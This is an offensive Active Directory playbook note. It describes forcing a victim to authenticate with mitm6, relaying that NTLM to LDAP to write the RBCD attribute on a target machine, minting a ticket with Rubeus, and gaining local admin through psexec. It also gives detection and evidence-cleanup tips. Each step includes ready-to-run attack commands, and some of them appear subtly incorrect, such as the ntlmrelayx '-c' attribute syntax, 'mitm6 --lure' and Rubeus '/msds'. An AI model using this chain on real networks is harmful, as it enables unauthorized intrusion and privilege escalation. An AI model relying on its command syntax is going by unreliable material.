---
title: "Attack Path: mitm6 (IPv6/ARP coercion) → NTLM relay to LDAP → RBCD → lateral to target (local admin)"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, relay, rbcd, mitm6, lateral-movement]
---

# Attack Path: mitm6 (coercion) → NTLM relay to LDAP → RBCD → lateral to target

The **force-a-user-to-auth, relay-to-LDAP, plant-RBCD** kill-chain: use
**[[mitm6]]** (rogue DHCP / ARP, IPv6) to **coerce** a victim into making an
NTLM authentication to your **[[ntlmrelayx]]**, **relay** that NTLM to **LDAP**,
and write the **Resource-Based Constrained Delegation** attribute
(`msDS-AllowedToActOnBehalfOfOtherIdentity`) on a **target machine** to include
your account. That single attribute write is the whole privesc: you can now
**mint a TGS to the target** and move laterally to it (local admin / service
access). See [[resource-based-constrained-delegation]] for the RBCD mechanics
and [[mitm6-ipv6-relay]] for the coercion + relay mechanics.

## Chain

```
You (low-priv, L2/L3 position on the victim's subnet)
  --mitm6 (rogue DHCP / ARP / IPv6)--> victim V forced to NTLM-auth to your ntlmrelayx
  --ntlmrelayx relays V's NTLM to LDAP--> write msDS-AllowedToActOnBehalfOfOtherIdentity += you  ON target machine M
  --Rubeus s4u /simple (RBCD)--> TGS to M as you
  --psexec / smb to M--> LOCAL ADMIN on M
```

## Prerequisites / what signals this path exists

- A **L2/L3 position** on the victim's segment — to run [[mitm6]] (rogue DHCP
  server, ARP spoofing, IPv6 neighbor/router). See [[mitm6-ipv6-relay]].
- A **coercable victim** `V` — a host that will make an outbound SMB/NTLM
  connection when lured (e.g. it checks a share, or the DHCP lure triggers it).
- **LDAP-write access via the relayed account** — the coerced account `V` must
  be able to **write `msDS-AllowedToActOnBehalfOfOtherIdentity`** on target
  machine `M` (any account that can set that attribute on `M`; often Domain
  Users can RBCD *onto* machines, or you relay a privileged `V`). See
  [[resource-based-constrained-delegation]].
- A **target machine** `M` you want to land on.

```bash
# Confirm: who can RBCD onto which machines?
#  (BloodHound "AllowedToAct" edges; or check the attribute write right)
```

## Step 1 — Start the relay to LDAP

```bash
# ntlmrelayx: receive the coerced NTLM, relay to LDAP, and write the RBCD attr on M
ntlmrelayx.py -t ldap://<dc> -s -c "msDS-AllowedToActOnBehalfOfOtherIdentity:add:CN=you,CN=Users,DC=corp,DC=local" -h M
# (the -c command writes the RBCD attribute on machine M to include your user)
```
**Verify:** ntlmrelayx is listening, targeting LDAP with the RBCD-write command.
See [[resource-based-constrained-delegation]] / [[mitm6-ipv6-relay]] for the
exact `-c` syntax.

### Failure modes & fallbacks
- **`V` can't write RBCD on `M`** — the coerced account lacks the attribute
  write right on `M`. Coerce a *more privileged* `V`, or target a machine
  where the domain allows RBCD writes (common on machines). See
  [[resource-based-constrained-delegation]].
- **LDAP signing enforced** — the relay needs an account whose NTLM is accepted
  (or disable signing for the test). See [[ntlm-relay-coercion]].

## Step 2 — Coerce the victim with mitm6

```bash
mitm6 --lure          # or the DHCP-spoof / ARP mode for your position
```
**Verify:** ntlmrelayx shows `V`'s account NTLM received and the RBCD
attribute **written on `M`** (the `-c` command succeeds, "LDAP write" logged).
See [[mitm6-ipv6-relay]] for the coercion modes.

### Failure modes & fallbacks
- **`V` doesn't reach the relay** — wrong subnet / the lure didn't trigger an
  SMB. Re-position or use a different coercion vector (PetitPotam, WCF).
- **The write lands on the wrong object** — confirm the `-h`/`-c` target is
  machine `M`, not another object.

## Step 3 — Mint a TGS to `M` via RBCD

```powershell
# You hold a TGT for yourself; RBCD lets you request a TGS to M as you
Rubeus.exe s4u /simple /user:you /userdomain:corp.local /tgt:<your-tgt> \
  /msds:M,corp.local /rc4     # -> TGS to M (ccache)
```
**Verify:** a ccache (TGS) for `M` is produced. See
[[resource-based-constrained-delegation]] for the s4u/RBCD request.

### Failure modes & fallbacks
- **No TGT / the s4u fails** — you need a valid TGT for yourself first
  (`Rubeus asktgt` or a current ticket). Ensure `you` is a valid domain
  account.
- **RC4 vs AES** — match the machine's ticket encryption
  ([[kerberos-encryption-types]]).

## Step 4 — Lateral to `M` (local admin)

```bash
# Use the RBCD TGS to reach M
export KRB5CCNAME=<M-tgs>.ccache
psexec.py -k corp.local/you@M      # -> local admin / service shell on M
# or: wmiexec.py -k corp.local/you@M
```
**Verify:** a shell on `M` (`whoami` = your account, local admin context).

### Failure modes & fallbacks
- **RBCD gives a service ticket, not full admin** — the access level on `M`
  depends on the service you targeted; if it's not admin, you still have a
  foothold to privesc locally (standard Windows privesc).
- **`M` blocks SMB/psexec** — use WMI/WinRM with the same TGS.

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 1-2 (coerce+relay) | **4624/4625** NTLM logons from `V` to your relay host; ARP/DHCP anomaly (IPv6 RA/NA, rogue DHCP) | an unexpected NTLM from a host to a non-standard host |
| 2 (RBCD write) | **5136** attribute change on machine `M` (`msDS-AllowedToActOnBehalfOfOtherIdentity`) | the RBCD attribute written on a machine |
| 3 (RBCD TGS) | **4769** TGS-REQ to `M` (your user) | a TGS for the machine SPN by a non-machine account |
| 4 (lateral) | **4624** logon to `M` as `you` | your account logging onto `M` |

## Cleanup notes
- The RBCD attribute write (5136 on `M`) is a **durable** artifact — remove it
  (`msDS-AllowedToActOnBehalfOfOtherIdentity:delete:...`) when done.
- The coercion leaves **NTLM logon** trails (4624/4625) and an ARP/IPv6
  anomaly — the loudest part.
- The RBCD TGS is short-lived; the lateral logon (4624) is the durable trail.

## Related
- [[resource-based-constrained-delegation]] — the RBCD primitive the chain writes (step 2-3)
- [[mitm6-ipv6-relay]], [[mitm6]] — the coercion + relay (step 1-2)
- [[ntlmrelayx]] — the relay engine
- [[ntlm-relay-coercion]] — the coercion family (PetitPotam, WCF, mitm6)
- [[kerberos-delegation-abuse]] — RBCD's sibling (forward/constrained delegation)
- [[service-principal-name]] — the machine SPN the RBCD TGS targets
- [[path-rbcd-to-domain-admin]] — the same RBCD primitive aimed at a DC (→ DCSync)
